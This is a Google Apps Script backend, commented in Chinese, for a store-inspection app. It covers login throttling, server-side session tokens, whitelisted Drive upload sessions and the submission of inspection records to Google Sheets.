/**
 * SQC 評核系統 — GAS 後端 API
 * ------------------------------------------------------------
 * 前端以 fetch 呼叫下列函式。照片由前端「直傳 Drive」，但上傳網址由後端
 * createUploadSessions() 建立（權杖不離開後端），本檔負責資料夾建立與資料表存取。
 *
 * 設定與活頁結構見 setup.gs / 資料結構_GoogleSheet.md
 */

// 後端版本：每次修改本檔就更新，並於前端「資料更新時間」旁顯示。
// 用途：貼上程式碼後若忘記「部署 → 管理部署作業 → 新版本」，畫面上的後端版本就不會變，
//       可立即分辨是「沒貼上」「貼了但沒部署」還是「已生效」。
var GAS_VERSION = '20260831-1100';   // 台灣時間 YYYYMMDD-HHMM

var SPREADSHEET_ID = '1GRZZsZRgakMGENspOxmlx96NfckC8UYOe0ipuNNEoh0';
var DRIVE_ROOT_ID  = '122nQjldImn5Zh5AUguxZF0YzobThgdc9';
var AUTH_API       = 'https://eip.fme.com.tw/FMEIP/AasApi/CheckUserId';

// ============================================================
// 入口：JSON API（前端 PWA 於 GitHub Pages，以 fetch 跨網域呼叫）
// 前端送 POST，Content-Type: text/plain（避開 CORS 預檢），body = {action, payload}
// ============================================================
function doGet() {
  return json({ ok: true, service: 'SQC API', version: GAS_VERSION, time: nowStr() });
}

function doPost(e) {
  try {
    var req = JSON.parse((e && e.postData && e.postData.contents) || '{}');
    var action = req.action;
    var p = req.payload || {};

    // ===== 授權閘門：除 login 外皆需有效 token；管理動作再驗管理者 =====
    var OPEN = { login: 1 };
    // buildMonthlyReport 不列管理者專屬：課長版/客戶版所有登入者皆可產出。
    // 請款金額雖同樣取這份資料，但單價僅回傳給管理者(見 buildMonthlyReport)，且按鈕限管理者顯示。
    var ADMIN_ONLY = { importMaster: 1, upsertItem: 1, deleteItem: 1, upsertRow: 1, deleteRow: 1, getMaster: 1, getChangeLog: 1, repairPhotoLinks: 1, recomputeScores: 1 };
    var sess = null;
    if (!OPEN[action]) {
      sess = getSession(req.token);
      if (!sess) return json({ ok: false, code: 'AUTH', error: '未登入或連線逾時，請重新登入' });
      if (ADMIN_ONLY[action] && sess.role !== '管理者') return json({ ok: false, error: '此功能需管理者權限' });
    }

    var routes = {
      login: function () { return login(p.userId, p.password); },
      getBootstrap: function () { return getBootstrap(p.month, p.section, p.light === true); },
      getStoreList: function () { return getStoreList(p.month, p.section); },
      getInspectedCodes: function () { return getInspectedCodes(p.month); },
      recordExists: function () { return recordExists(p.month, p.id); },
      createUploadSessions: function () { return { sessions: createUploadSessions(p.items, p.origin) }; },
      submitRecord: function () { return submitRecord(p.record); },
      attachPhotoLinks: function () { return attachPhotoLinks(p.month, p.recordId, p.links, p.deferShare === true); },
      sharePhotoLinks: function () { return sharePhotoLinks(p.links); },
      queryRecords: function () { return { records: queryRecords(p.month, p.filter) }; },
      updateRecord: function () { return updateRecord(p.month, p.id, p.record, p.pass, sess && (sess.ad || sess.name)); },
      deleteRecord: function () { return deleteRecord(p.month, p.id, p.pass, sess && (sess.ad || sess.name)); },
      checkEditPass: function () { return checkEditPass(p.pass, sess && (sess.ad || sess.name)); },
      getSummary: function () { return getSummary(p.month, p.filter); },
      buildMonthlyReport: function () { return buildMonthlyReport(p.month, p.filter, sess && sess.role === '管理者'); },
      importMaster: function () { return importMaster(p.kind, p.month, p.rows, p.fileName, p.batches); },
      upsertItem: function () { return upsertItem(p.month, p.item); },
      deleteItem: function () { return deleteItem(p.month, p.id); },
      upsertRow: function () { return upsertRow(p.kind, p.month, p.row); },
      deleteRow: function () { return deleteRowByKind(p.kind, p.month, p.id); },
      getMaster: function () {
        ensureKindSheet(p.kind, p.month);
        var all = readSheet(sheetForKind(p.kind, p.month));
        var LIMIT = 800; // 大表(如店鋪主檔4000+筆)避免整包傳輸拖慢/逾時
        // byType 必須在後端用「全部資料」算：前端只拿到前 800 筆，自己數會少算
        return { rows: all.slice(0, LIMIT), total: all.length, truncated: all.length > LIMIT,
          byType: countByStoreType(all) };
      },
      getChangeLog: function () { return getChangeLog(p.limit); },
      lookupStore: function () { return lookupStore(p.q); },
      getPhotoThumbs: function () { return { thumbs: photoThumbs(p.fileIds) }; },
      getPhotoImage: function () { return photoImage(p.fileId); },
      trashPhotos: function () { return trashPhotos(p.fileIds); },
      repairRecordPhotos: function () { return repairRecordPhotos(p.month, p.recordId); },
      logEvent: function () { return logEvent(p.event, p.detail, sess && (sess.name || sess.ad)); },
      // 整月補回照片連結（維護專區用；write=false 只試算）。定義在 setup.gs，同專案可直接呼叫
      repairPhotoLinks: function () { return repairPhotoLinks(p.month, p.write === true); },
      // 整月重算分區扣分題的分數（修正非同步造成的合計不一致；write=false 只試算）。同樣定義在 setup.gs
      recomputeScores: function () { return recomputeScores(p.month, p.write === true); },
    };
    if (!routes[action]) return json({ ok: false, error: '未知動作：' + action });
    var result = routes[action]();

    // 記錄維護/資料異動軌跡
    // 異動紀錄：只記「刪除」與「修改」，不記新增/送出/匯入（避免每月上千筆送出把軌跡淹掉）
    // 「操作人」一律記登入帳號者（who 取自登入 token），與紀錄裡的「點檢人員」是不同概念
    var LOGGED = { upsertItem: '修改題目', upsertRow: '修改', deleteItem: '刪除題目', deleteRow: '刪除', deleteRecord: '刪除點檢紀錄', updateRecord: '修改點檢紀錄', trashPhotos: '刪除照片' };
    var isUpsert = (action === 'upsertItem' || action === 'upsertRow');
    var skipAsAdd = isUpsert && result && result.mode !== 'update'; // upsert 若是新增就不記錄
    if (LOGGED[action] && !(result && result.ok === false) && !skipAsAdd) { // 被擋下的動作(如同店重複)不記錄
      var who = sess ? (sess.name || sess.ad) : '';
      var target = '', note = '';
      if (action === 'upsertRow' || action === 'upsertItem') { target = (p.kind || 'checklist') + (p.month ? '_' + p.month : ''); note = ((p.row && (p.row['編號'] || p.row['店號'] || p.row['工號'])) || (p.item && p.item['編號']) || ''); }
      else if (action === 'deleteRow' || action === 'deleteItem') { target = (p.kind || 'checklist') + (p.month ? '_' + p.month : ''); note = '刪除 ' + (p.id || ''); }
      else if (action === 'updateRecord') {
        var ur = p.record || {};
        target = '點檢紀錄_' + p.month;
        note = (p.id || '') + ' ' + (ur.storeName || '') + '（點檢人員：' + (ur.staffName || '') + '）';
      }
      else if (action === 'deleteRecord') { target = '點檢紀錄_' + p.month; note = p.id || ''; }
      else if (action === 'trashPhotos') { target = 'Drive 照片'; note = (p.fileIds || []).length + ' 張（' + (p.note || '') + '）'; }
      logChange(who, LOGGED[action], target, note);
    }
    return json({ ok: true, result: result });
  } catch (err) {
    return json({ ok: false, error: String(err && err.message || err) });
  }
}

/**
 * 前端主動記錄的事件。目前只有一種：照片還沒傳完就選擇離開 ——
 * 訊號差的門市硬擋住不讓送出會讓人做不完事情，所以留了出口，
 * 但要把「知情的決定」記進異動紀錄，事後才追得出是哪一筆、誰做的決定。
 * 事件名稱走白名單：否則任何登入者都能往異動紀錄塞任意文字。
 */
var CLIENT_EVENTS = {
  leaveWithPendingPhotos: '照片未傳完即離開',
  // 手機儲存空間不足導致照片存不進待傳佇列。這種情況照片會直接遺失（紀錄裡也不會記到），
  // 必須留下軌跡，否則事後只會看到「這家店照片比較少」而查不出原因。
  photoQueueFull: '照片存不進待傳佇列',
  // 照片重試很多次還是傳不上去時，把「原因」送回來。
  // 沒有這一項的話那個錯誤字串只會存在該支手機的 IndexedDB 裡 ——
  // 2026-08-27 有人一小時內重試幾百次全數失敗，事後只能靠猜。
  photoUploadStuck: '照片上傳卡住',
};
// 這支是前端可任意呼叫的寫入點，沒有上限的話任何登入者都能不斷往異動紀錄塞 500 字的列，
// 把真正的軌跡淹掉（活頁有儲存格上限）。一位點檢人員一小時內正常不會超過幾筆，
// 60 筆已遠高於合理使用量。
var LOGEVENT_MAX_PER_HOUR = 60;
function logEvent(event, detail, who) {
  var label = CLIENT_EVENTS[String(event || '')];
  if (!label) return { ok: false, message: '未知事件' };   // 只收白名單事件，不讓前端自訂動作名稱
  var key = 'logevt_' + String(who || 'anon').toLowerCase();
  var cache = CacheService.getScriptCache();
  var n = (Number(cache.get(key)) || 0) + 1;
  cache.put(key, String(n), 3600);
  if (n > LOGEVENT_MAX_PER_HOUR) return { ok: false, message: '記錄次數過多，已略過' };
  logChange(who || '', label, '點檢紀錄', String(detail || '').slice(0, 500));
  return { ok: true };
}

/** 依「店鋪型態」統計筆數（供店鋪名單顯示「總店數x店(一般店x店，隨盤點點檢店x店)」）。
 *  沒有這個欄位的表（題庫、人員…）回 null，前端就不顯示。*/
function countByStoreType(rows) {
  if (!rows || !rows.length || !rows[0].hasOwnProperty('店鋪型態')) return null;
  var out = {};
  rows.forEach(function (r) {
    var t = String(r['店鋪型態'] == null ? '' : r['店鋪型態']).trim() || '(未填)';
    out[t] = (out[t] || 0) + 1;
  });
  return out;
}

/**
 * 把剛回寫連結的照片設為「知道連結的人可檢視」，讓客戶版報表的照片連結不必登入 Google 也能開。
 *
 * 安全前提：fileId 是前端傳進來的，若不驗證歸屬，有心人可以拿這支 API 把擁有者帳號裡
 * 任何檔案設成對外公開。因此一律先用 fileUnderPhotoRoot_() 確認檔案在照片資料夾底下。
 * 另外：若公司 Workspace 政策禁止對外連結分享，setSharing 會丟例外 —— 不可讓它中斷
 * 連結回寫（照片與紀錄的關聯比分享權限重要），故個別 try/catch 並回報失敗數。
 */
function shareLinkedPhotos(links) {
  var ok = 0, failed = 0, lastErr = '';
  Object.keys(links || {}).forEach(function (key) {
    (links[key] || []).forEach(function (link) {
      var id = link && link.fileId;
      if (!id) return;
      try {
        var f = DriveApp.getFileById(String(id));
        if (!fileUnderPhotoRoot_(f)) { failed++; return; }      // 不是本系統照片，一律不動
        f.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
        ok++;
      } catch (e) { failed++; lastErr = String(e && e.message || e); }
    });
  });
  if (failed) Logger.log('照片分享設定失敗 ' + failed + ' 張：' + lastErr);
  return { ok: ok, failed: failed };
}

function json(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON);
}

// ============================================================
// 登入（伺服器端呼叫 CheckUserId，避免前端 CORS）
// ============================================================
// 登入節流（2026-08 資安檢測 Medium 項目）
//   本 Web App 對外開放且 login 不需權杖，若不限制次數，本系統就成了對公司 AD
//   做密碼噴灑/暴力破解的代理，而且在 AD 端看到的來源 IP 全是 Google 的伺服器。
//   計數只算「帳密/AD 被拒絕」(100/200)；服務本身異常(998/999)不計，
//   否則驗證服務出問題時會把正常使用者一起鎖住。
var LOGIN_MAX_FAILS = 5;
var LOGIN_BLOCK_SEC = 900;   // 連續失敗達上限後封鎖 15 分鐘（每次再嘗試會重新計時）

function loginFailKey(userId) { return 'loginfail_' + String(userId || '').toLowerCase(); }
function loginFailCount(userId) {
  var v = CacheService.getScriptCache().get(loginFailKey(userId));
  return v ? Number(v) || 0 : 0;
}
function bumpLoginFail(userId) {
  var n = loginFailCount(userId) + 1;
  CacheService.getScriptCache().put(loginFailKey(userId), String(n), LOGIN_BLOCK_SEC);
  return n;
}
function clearLoginFail(userId) { CacheService.getScriptCache().remove(loginFailKey(userId)); }

function login(userId, password) {
  userId = String(userId || '').slice(0, 15);
  password = String(password || '').slice(0, 30);
  if (!userId || !password) return { ok: false, message: '請輸入帳號與密碼' };

  // 超過上限就直接擋下，連 AD 都不去打
  if (loginFailCount(userId) >= LOGIN_MAX_FAILS) {
    return { ok: false, code: 'THROTTLED',
      message: '登入失敗次數過多，請等 ' + Math.round(LOGIN_BLOCK_SEC / 60) + ' 分鐘後再試（若忘記密碼請聯絡資訊人員）' };
  }

  var code = '999';
  try {
    var res = UrlFetchApp.fetch(AUTH_API, {
      method: 'post',
      contentType: 'application/json',
      payload: JSON.stringify({ USER_ID: userId, PSW: password }),
      muteHttpExceptions: true,
    });
    var data = JSON.parse(res.getContentText() || '{}');
    code = String(data.MSG || '999').split(' ')[0];
  } catch (e) {
    return { ok: false, message: '無法連線驗證服務，請稍後再試' };
  }

  var errMap = {
    '100': '帳號或密碼錯誤',
    // 200 不是打錯密碼(那是100)，是 AD 端拒絕/無法完成認證，常見於帳號被鎖定或密碼已過期
    '200': 'AD 認證錯誤：可能是帳號已鎖定或密碼過期。請先用同一組帳密登入 EIP 確認，或聯絡資訊人員',
    '998': '系統暫時無法使用，請稍後再試',
    '999': '系統發生錯誤，請聯絡管理員',
  };
  if (code !== '000') {
    // 只有「帳密/AD 被拒絕」才計入節流；服務異常不算，避免驗證服務出問題時鎖住正常使用者
    if (code === '100' || code === '200') {
      var fails = bumpLoginFail(userId);
      var left = LOGIN_MAX_FAILS - fails;
      return { ok: false, message: errMap[code] + (left > 0 ? '（再失敗 ' + left + ' 次將暫時鎖定）' : '') };
    }
    return { ok: false, message: errMap[code] || errMap['999'] };
  }
  clearLoginFail(userId);   // 成功即歸零

  // 以 AD 比對「點檢人員」名冊取身分。
  // 名冊多數人的 AD 欄是空的，故比對不到時仍放行（只要日翊帳密正確就能登入、能點檢），
  // 只是取不到工號/部課/角色 → 角色以「點檢員」計，登入後於基本資料自行選取點檢人員。
  // 權限差異只在：管理者才看得到「維護專區」與報表/請款產出；查詢紀錄所有人皆可查全部。
  var staff = findStaffByAd(userId) || { empId: '', name: '', dept: '', section: '', role: '點檢員', ad: userId };
  staff.token = issueToken(staff, userId);
  return { ok: true, user: staff };
}

// ===== 登入 token（伺服器端授權；存 CacheService，效期 6 小時）=====
function issueToken(staff, ad) {
  var token = Utilities.getUuid();
  CacheService.getScriptCache().put('sess_' + token,
    JSON.stringify({ role: staff.role || '點檢員', name: staff.name, empId: staff.empId, ad: ad }), 21600);
  return token;
}
function getSession(token) {
  if (!token) return null;
  var c = CacheService.getScriptCache().get('sess_' + token);
  return c ? JSON.parse(c) : null;
}

function findStaffByAd(ad) {
  var rows = readSheet('點檢人員');
  ad = String(ad).toLowerCase();
  for (var i = 0; i < rows.length; i++) {
    if (String(rows[i]['AD帳號'] || '').toLowerCase() === ad) {
      return {
        empId: rows[i]['工號'], name: rows[i]['姓名'], dept: rows[i]['部別'], title: rows[i]['職稱'],
        section: rows[i]['課別'], role: rows[i]['角色'] || '點檢員', ad: rows[i]['AD帳號'],
      };
    }
  }
  return null;
}

// ============================================================
// 開場資料：當月題庫 + 店鋪名單(依課別) + 設定
// ============================================================
/**
 * 開場資料。
 * light=true 時「不含門市名單」—— 名單由前端另外呼叫 getStoreList 在背景取，
 * 這樣畫面 1~2 秒就能開起來，不必等近 200KB 的名單（見 getStoreList 的說明）。
 * 舊版前端不會帶這個參數，所以仍然拿到完整資料，不會因為後端先更新而壞掉。
 */
function getBootstrap(month, section, light) {
  ensureMonth(month); // 開啟某月即自動建齊該月所有活頁
  // 「點檢人員」只讀一次：原本 staffs 與 distinctDepts() 各讀一次整張活頁，
  // 而這支是開場的關鍵路徑（前端等它才能用），每一次多餘的整表讀取都直接加在等待時間上。
  var people = readSheet('點檢人員');
  return {
    month: month,
    gasVersion: GAS_VERSION,   // 供前端顯示，用來確認後端是否已部署到最新版
    passScore: Number(getSetting('及格分數') || 85),
    checklist: getChecklist(month),
    observations: getObservations(month),
    stores: light === true ? [] : getStores(month, section),
    // 點檢人員下拉：只帶「有填部別或課別」的人員（純管理者未填部/課者不列入下拉，但仍可登入）
    staffs: people.filter(function (r) {
      return String(r['部別'] || '').trim() !== '' || String(r['課別'] || '').trim() !== '';
    }).map(function (r) {
      return { empId: r['工號'], name: r['姓名'], dept: r['部別'], section: r['課別'], title: r['職稱'] };
    }),
    depts: distinctDepts(people),
  };
}

function getChecklist(month) {
  var rows = readSheet('題庫_' + month);
  return rows.map(function (r) {
    var type = String(r['計分方式']).indexOf('分區') >= 0 ? 'subdeduct' : 'deduct';
    var item = {
      id: r['編號'], name: r['題號名稱'], cat: r['大分類'],
      max: Number(r['配分']) || 0, type: type, desc: r['規範說明'] || '', order: Number(r['排序']) || 0,
      perPoint: Number(r['每項扣分']) || 0, subsRaw: r['子項清單'] || '',
    };
    if (type === 'subdeduct') item.subs = parseSubs(r['子項清單']);
    return item;
  }).sort(function (a, b) { return a.order - b.order; });
}

/** 子項編碼解析：以 | 分隔；label:2=units、label:填寫=custom、label（說明）=note */
function parseSubs(raw) {
  if (!raw) return [];
  return String(raw).split('|').map(function (tok) {
    tok = tok.trim();
    var note = '';
    var nm = tok.match(/（([^）]*)）\s*$/);
    if (nm) { note = nm[1]; tok = tok.replace(/（[^）]*）\s*$/, '').trim(); }
    var parts = tok.split(':');
    var label = parts[0].trim();
    var flag = (parts[1] || '').trim();
    var sub = { label: label };
    if (flag === '填寫') sub.custom = true;
    else if (flag && !isNaN(Number(flag))) sub.units = Number(flag);
    if (note) sub.note = note;
    return sub;
  });
}

// 觀察題（分月）→ 分成 拍照/有無/符合 三組回前端
function getObservations(month) {
  var rows = readSheet('觀察題_' + month).sort(function (a, b) { return (Number(a['排序']) || 0) - (Number(b['排序']) || 0); });
  var key = [], toilet = [], inspect = [];
  rows.forEach(function (r) {
    var t = String(r['類型'] || '');
    var id = r['編號'], name = r['題目名稱'];
    if (t.indexOf('拍照') >= 0) key.push({ id: id, name: name, required: (String(r['必填']) === '是' || String(r['必填']).toUpperCase() === 'Y') });
    else if (t.indexOf('符合') >= 0) inspect.push({ id: id, name: name, opts: String(r['選項'] || '').split('|').filter(Boolean) });
    else toilet.push({ id: id, name: name, opts: String(r['選項'] || '有|無').split('|'), show: String(r['顯示條件'] || 'always') });
  });
  return { keyObservations: key, toiletObservations: toilet, toiletInspect: inspect };
}

// 自行新增店鋪：以店號或店名查店鋪主檔（回最多 20 筆）
function lookupStore(q) {
  q = String(q || '').trim();
  if (!q) return { rows: [] };
  var rows = readSheet('店鋪主檔');
  var out = [];
  for (var i = 0; i < rows.length && out.length < 20; i++) {
    var code = String(rows[i]['店號'] || ''), name = String(rows[i]['店名'] || '');
    if (code === q || name === q || (name.indexOf(q) >= 0) || (code.indexOf(q) >= 0)) {
      out.push({ code: code, name: name, section: rows[i]['營業課名稱'] || '', dept: rows[i]['營業部名稱'] || '' });
    }
  }
  return { rows: out };
}

/**
 * 門市名單（前端專用的精簡格式）。
 * 為什麼跟 getStores 分開：開場的 getBootstrap 原本要一併搬 1500+ 家店，
 * 六次整表讀取＋近 200KB 的傳輸讓它常常撞上逾時（2026-08-26 現場一直出現載入失敗）。
 * 拆成獨立的一支之後，前端可以先拿到題庫/人員把畫面開起來，名單在背景補。
 * 格式也改為「欄位名一次 + 每列一個陣列」：物件格式的鍵名重複 1500 次，
 * 光鍵名就占掉將近一半的位元組。另外 remote/holiday/batch 前端完全沒用到，不傳。
 * cols 一併回傳，前端照它還原成物件 —— 日後增減欄位不必兩邊一起改。
 */
var STORE_LIST_COLS = ['code', 'name', 'section', 'type'];
function getStoreList(month, section) {
  var rows = readSheet('店鋪名單_' + month);
  var out = [];
  for (var i = 0; i < rows.length; i++) {
    var r = rows[i];
    if (section && String(r['課別']) !== String(section)) continue;
    out.push([String(r['店號']), r['店名'], r['課別'], r['店鋪型態'] || '一般店']);
  }
  return { cols: STORE_LIST_COLS, rows: out };
}

function getStores(month, section) {
  var rows = readSheet('店鋪名單_' + month);
  return rows.filter(function (r) {
    return !section || String(r['課別']) === String(section);
  }).map(function (r) {
    var yn = function (v) { return v === true || v === 'V' || v === 'v' || v === '是' || v === '1'; };
    return {
      code: String(r['店號']), name: r['店名'], section: r['課別'], type: r['店鋪型態'] || '一般店',
      remote: yn(r['遠程店']), holiday: yn(r['假日店']), batch: r['預排梯次'] || '',
    };
  });
}

// ============================================================
// Drive：發權杖 + 建立/快取資料夾（供前端直傳）
// ============================================================
/**
 * 為每張照片建立 Drive「可續傳上傳(resumable)」工作階段，只把單檔上傳網址交給瀏覽器。
 *
 * 為什麼不能直接把權杖給前端（2026-08 資安檢測 High 項目）：
 *   ScriptApp.getOAuthToken() 的權限範圍是本腳本申請的全部範圍（drive + spreadsheets），
 *   等於腳本擁有者「整個雲端硬碟與所有試算表」的存取權。任何登入者只要在瀏覽器
 *   開發者工具取得該權杖，就能繞過本系統存取與 SQC 無關的檔案。
 * 工作階段網址的權限則只限「寫入它所對應的那一個檔案」，且上傳完即失效，範圍最小。
 *
 * items: [{ pathParts: [...], name: '檔名.jpg' }]
 * 回傳與 items 等長的陣列：{ ok: true, url } 或 { ok: false, error }
 */
var UPLOAD_SESSION_MAX = 20; // 一次最多開幾個，避免 UrlFetchApp 逾時

// 建立工作階段時必須帶 Origin，該工作階段網址才會允許來自這個網域的跨網域 PUT。
// 不帶的話瀏覽器會被 CORS 擋掉（No 'Access-Control-Allow-Origin' header）。
// 用白名單而非直接回填呼叫端傳來的值，避免有人替自己的網站鑄造可用的上傳網址。
var DEFAULT_ORIGIN = 'https://fme-c-user.github.io';
var ALLOWED_ORIGINS = {
  'https://fme-c-user.github.io': 1,                        // GitHub Pages（原入口）
  'https://sqc-checklist-ec6xuimwxa-de.a.run.app': 1,       // GCP Cloud Run 舊格式（對外公布的網址）
  // Cloud Run 對同一個服務會「同時」提供新舊兩種格式的網址，兩個都通。
  // 2026-08-28 實測 https://sqc-checklist-403438157899.asia-east1.run.app 也回 200，
  // 而它不在白名單裡 —— 任何人從它開 App，照片會 100% 全數上傳失敗（見下方 originFor_ 的說明）。
  'https://sqc-checklist-403438157899.asia-east1.run.app': 1,
  'http://localhost:8931': 1,                               // 本機測試用
};

/** 同資料夾內已有同檔名的照片就直接回傳它的 ID（照片檔名為 店號_日期_題目_序號，固定不變）。
 *  用途一：重試時不會再上傳一份，避免 Drive 出現大量重複檔案。
 *  用途二：先前因 CORS 失敗（瀏覽器讀不到回應，但 Drive 其實已寫入成功）的照片可被認領回來。
 *  注意：DriveApp 的檔案迭代會包含「已在垃圾桶」的檔案，必須排除 —— 否則會認領到一個
 *        30 天後就會消失的檔案，紀錄裡的連結等於是死的。*/
function findFileIdByName(folderId, name) {
  try {
    var it = DriveApp.getFolderById(folderId).getFilesByName(name);
    while (it.hasNext()) {
      var f = it.next();
      if (!f.isTrashed()) return f.getId();
    }
    return '';
  } catch (e) {
    return '';
  }
}

/**
 * 決定要用哪個 Origin 去向 Drive 建立上傳工作階段。
 *
 * 這件事不可以「比對失敗就靜默退回預設值」——
 * Drive 只允許「建立工作階段時登記的那個 Origin」對該網址做跨來源 PUT。
 * 若前端實際所在的網址不是登記的那一個，瀏覽器的 preflight 會被擋，
 * PUT 根本不會送出 → 那支手機的每一張照片都失敗，而後端這邊
 * 工作階段建立成功、執行記錄一片乾淨，完全看不出異常。
 * 2026-08-28 查一起「照片 0 進度」時，就是因為這個靜默退回而多繞了很久。
 *
 * 所以：帶了網址但不在白名單 → 明確報錯，讓使用者第一次就知道；
 *       完全沒帶（很舊的前端）→ 只能沿用預設值，維持相容。
 */
function originFor_(origin) {
  var o = String(origin || '');
  if (!o) return { ok: true, origin: DEFAULT_ORIGIN };
  if (ALLOWED_ORIGINS[o]) return { ok: true, origin: o };
  // 回填客端送來的字串要截斷。訊息會一路流到 photo.error、再經 photoUploadStuck
  // 寫進異動紀錄（那一段本來就有 500 字上限與 safeCell_ 中和），但回應本身不該無界。
  o = o.slice(0, 120);
  return { ok: false, error: '這個網址不在允許清單內：' + o
    + '。照片無法上傳，請改用官方網址 https://sqc-checklist-ec6xuimwxa-de.a.run.app/app.html'
    + '（若這是新的正式網址，請將它加入後端的 ALLOWED_ORIGINS）' };
}

function createUploadSessions(items, origin) {
  items = (items || []).slice(0, UPLOAD_SESSION_MAX);
  if (!items.length) return [];
  var chk = originFor_(origin);
  if (!chk.ok) {
    // 每一項都回同一個錯誤：前端會把它存進 photo.error 並顯示，不會變成沉默的失敗
    var bad = [];
    for (var b = 0; b < items.length; b++) bad.push({ ok: false, error: chk.error });
    return bad;
  }
  var org = chk.origin;
  var token = ScriptApp.getOAuthToken(); // 只在伺服器端使用，不回傳給前端
  var out = [], reqs = [], reqAt = [];
  for (var i = 0; i < items.length; i++) {
    var it = items[i] || {};
    var name = String(it.name || 'photo.jpg');
    var folderId = getUploadFolderId(it.pathParts || []);
    // 效能：第一次上傳時 Drive 上不可能已有這個檔案，查了必然白查（每次約 0.2~0.4 秒）。
    // 只有前端明確表示「這是重試」才查。舊版前端不會帶 retry → 預設仍查，維持安全行為。
    var exist = (it.retry === false) ? '' : findFileIdByName(folderId, name);
    if (exist) { out[i] = { ok: true, existing: true, fileId: exist }; continue; }
    out[i] = null;
    reqAt.push(i);
    reqs.push({
      url: 'https://www.googleapis.com/upload/drive/v3/files?uploadType=resumable&fields=id',
      method: 'post',
      contentType: 'application/json; charset=UTF-8',
      headers: { Authorization: 'Bearer ' + token, 'X-Upload-Content-Type': 'image/jpeg', Origin: org },
      payload: JSON.stringify({ name: name, parents: [folderId] }),
      muteHttpExceptions: true,
    });
  }
  if (reqs.length) {
    var res = UrlFetchApp.fetchAll(reqs);
    for (var k = 0; k < res.length; k++) {
      var r = res[k], code = r.getResponseCode();
      if (code >= 300) { out[reqAt[k]] = { ok: false, error: 'Drive 建立上傳工作階段失敗（' + code + '）' }; continue; }
      var h = r.getAllHeaders() || {};
      var loc = h['Location'] || h['location'] || '';
      if (loc && typeof loc !== 'string' && loc.length) loc = loc[0]; // 重複標頭會回陣列
      out[reqAt[k]] = loc ? { ok: true, url: String(loc) } : { ok: false, error: 'Drive 未回傳上傳網址' };
    }
  }
  return out;
}

/** 依 [月份, 題目, 區域...] 取得目標資料夾 ID（自動建立、Script Properties 快取）
 *  多人同時是「該路徑第一次上傳」時，用鎖避免各自建出同名資料夾 */
function getUploadFolderId(pathParts) {
  var props = PropertiesService.getScriptProperties();
  var key = 'folder:' + pathParts.join('/');
  var cached = props.getProperty(key);
  if (cached) {
    try { DriveApp.getFolderById(cached); return cached; } catch (e) { /* 失效重建 */ }
  }
  var lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    cached = props.getProperty(key); // 等鎖期間可能已被其他請求建好，先重查一次
    if (cached) {
      try { DriveApp.getFolderById(cached); return cached; } catch (e) { /* 失效重建 */ }
    }
    var folder = DriveApp.getFolderById(DRIVE_ROOT_ID);
    for (var i = 0; i < pathParts.length; i++) {
      folder = getOrCreateChild(folder, pathParts[i]);
    }
    props.setProperty(key, folder.getId());
    return folder.getId();
  } finally {
    lock.releaseLock();
  }
}

function getOrCreateChild(parent, name) {
  var it = parent.getFoldersByName(name);
  return it.hasNext() ? it.next() : parent.createFolder(name);
}

// ============================================================
// 點檢紀錄：送出 / 查詢 / 修改 / 刪除（皆只操作當月活頁）
// ============================================================
function submitRecord(rec) {
  var lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    var sh = ensureSheetNamed('點檢紀錄_' + rec.month, HEADERS_MAP.record); // 缺活頁自動建立
    // 只讀「紀錄ID」與「店號」兩欄。原本用 getDataRange() 把整張表讀進來，
    // 但那張表每一列都含明細/觀察/照片JSON —— 月底上千筆時光是讀就要好幾秒，
    // 而這裡只需要比對兩個欄位。找到重複才去讀那一列的細節（下面的 dupAt）。
    var lastRow = sh.getLastRow();
    var head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
    var idCol = head.indexOf('紀錄ID');
    var storeCol = head.indexOf('店號');
    var ids = (lastRow > 1 && idCol >= 0) ? sh.getRange(2, idCol + 1, lastRow - 1, 1).getValues() : [];
    var codes = (lastRow > 1 && storeCol >= 0) ? sh.getRange(2, storeCol + 1, lastRow - 1, 1).getValues() : [];
    var recId = String(rec.id || '');
    var recCode = normCode(rec.storeCode);
    /**
     * 兩種「已存在」要分清楚，順序也不能顛倒：
     *   1. 同一個紀錄ID → 這一筆先前其實已經寫入成功，只是回應在網路上遺失，
     *      用戶端自動重送了同一筆（api.js 逾時會重試最多四次，紀錄ID 是前端產生的
     *      UUID，重送時不變）。這時必須回「成功」——
     *      2026-08-26 現場就是這樣：同事只按一次上傳，等了很久卻被告知「已有點檢紀錄」，
     *      而那筆紀錄正是他自己第一次送出的。回報錯誤會讓人以為整份表白填了。
     *   2. 不同紀錄ID、同一家店 → 真的重複（別人搶先送，或自己在另一台裝置另填了一份）。
     * 所以要先把整張表看完確認有沒有同 ID，才能判定是不是真的重複 ——
     * 若邊掃邊回 DUPLICATE，同 ID 的那一列排在後面就永遠看不到。
     */
    var sameId = false, dupAt = -1;   // dupAt 為 0-based（對應 ids/codes 的索引）
    for (var i = 0; i < ids.length; i++) {
      if (recId !== '' && String(ids[i][0]) === recId) { sameId = true; break; }
      if (dupAt < 0 && recCode !== '' && codes[i] && normCode(codes[i][0]) === recCode) dupAt = i;
    }
    if (sameId) {
      // resent：供前端區分「重送被確認」與「第一次就成功」，兩者都是成功
      return { ok: true, id: recId, resent: true };
    }
    if (dupAt >= 0) {
      // 只有真的重複時才去讀那一列（讀一列很便宜，比整張表讀進來划算太多）
      var dupRow = sh.getRange(dupAt + 2, 1, 1, head.length).getValues()[0];
      var staffCol = head.indexOf('點檢人員');
      var timeCol = head.indexOf('點檢時間');
      var who = staffCol >= 0 ? String(dupRow[staffCol] || '') : '';
      var when = timeCol >= 0 ? toYmd(dupRow[timeCol]) : '';
      return {
        ok: false, code: 'DUPLICATE',
        // 帶出「誰、什麼時候」才知道要找誰確認；原本一律寫「其他人」，
        // 但也可能是自己在另一台裝置送的，講死反而誤導
        message: '這家店本月已有點檢紀錄'
          + (who ? '（' + who + (when ? ' 於 ' + when : '') + ' 送出）' : '')
          + '，請至查詢紀錄編輯該筆',
      };
    }
    var id = recId || (Utilities.getUuid());
    var now = nowStr();
    var row = recordToRow(sh, Object.assign({}, rec, { id: id, createdAt: now, updatedAt: now }));
    sh.appendRow(row);
    return { ok: true, id: id };
  } finally {
    SpreadsheetApp.flush();
    lock.releaseLock();
  }
}

// 照片直傳 Drive 完成後，把雲端連結(fileId)回寫進紀錄的照片JSON，讓報表能列出連結
